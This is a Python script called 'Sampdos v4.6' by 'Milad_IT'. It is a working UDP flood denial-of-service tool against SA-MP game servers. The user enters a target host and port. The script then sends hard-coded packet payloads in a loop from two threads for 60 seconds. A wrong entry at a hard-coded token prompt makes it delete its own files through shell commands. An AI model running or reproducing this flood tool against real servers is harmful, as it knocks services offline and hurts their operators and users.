import socket, struct, codecs, threading, random, time, argparse, os, sys


current_file = os.path.basename(__file__)

if current_file != 'sampdos.py':
    print("\033[1;31m This program is executed only if the file name is sampdos.py\033[31m")
    time.sleep(2)
    sys.exit(1)


print("Milad_IT Sampdos v4.6")

# // log
###### By Milad_IT
print("\033[1;37mWelcome to SAMPDOS \033[30m")
time.sleep(2)
print("Loading.......")

#### Login       

attemps = 0

while attemps < 100:
    username = input('Enter your Token: ')

    if username == 'Milad091':
        print('  ')
        print("\033[1;32mYou have successfully logged in Welcome to Sampdos \03")
        time.sleep(1.5)
        break
    else:
        print(" ")
        print("\033[1;31mIncorrect Token \03")
        time.sleep(2)
        os.system("del sampdos.py")
        os.system("del sampdos.exe")
        os.system('cls' if os.name == 'nt' else 'clear')
        exit(0)


os.system('cls' if os.name == 'nt' else 'clear')
#clear text print



input_string = input("Enter Your Target Host And Port : ")

target, port = input_string.split(':')

host = socket.gethostbyname(target)

times = "60"

os.system('cls' if os.name == 'nt' else 'clear')



print("                      \u001b[35m Sent Attack   ")
print(" ")
print(" ")
print("              Address IP : {}:{}".format(host, port))
print("________________________________________________")
print("              Timer Attack : {}".format(times))
print("              Power Attack : 1")
print("              Method Attack : Samp dos")
print(" $ ")
print(" $ ")
print('                      Created By Milad_IT ')

def sampdos(host, port, times):

    timeout = time.time() + float(times)
    #sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    #sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    packet1 = b'\x08\x1e\x19\xda'
    packet2 = b'\x08\x1e\xae\xda'
    packet3 = b'\x08\x1ew\xda'
    packet4 = b'\x08\x1e\x1c\xda'
    packet5 = b'\x08\x1e\xa5\xda'
    packet6 = b'\x82\x1e\xfe\xb6'
    packet7 = b'\x08\x1e\x13\xda'
    packet8 = b'\x08\x1e\xb8\xda'
    packet9 = b'\x08\x1eA\xda'

    while time.time() < timeout:

        if int(port) == 9999:
            sock.sendto(packet1, (host, int(port)))
        elif int(port) == 8888:
            sock.sendto(packet2, (host, int(port)))
        elif int(port) == 7777:
            sock.sendto(packet3, (host, int(port)))
        elif int(port) == 6666:
            sock.sendto(packet4, (host, int(port)))
        elif int(port) == 5555:
            sock.sendto(packet5, (host, int(port)))
        elif int(port) == 4444:
            sock.sendto(packet6, (host, int(port)))
        elif int(port) == 3333:
            sock.sendto(packet7, (host, int(port)))
        elif int(port) == 2222:
            sock.sendto(packet8, (host, int(port)))
        elif int(port) == 1111:
            sock.sendto(packet9, (host, int(port)))

for y in range(2):

    threading.Thread(target=sampdos, args=(host, port, times)).start()
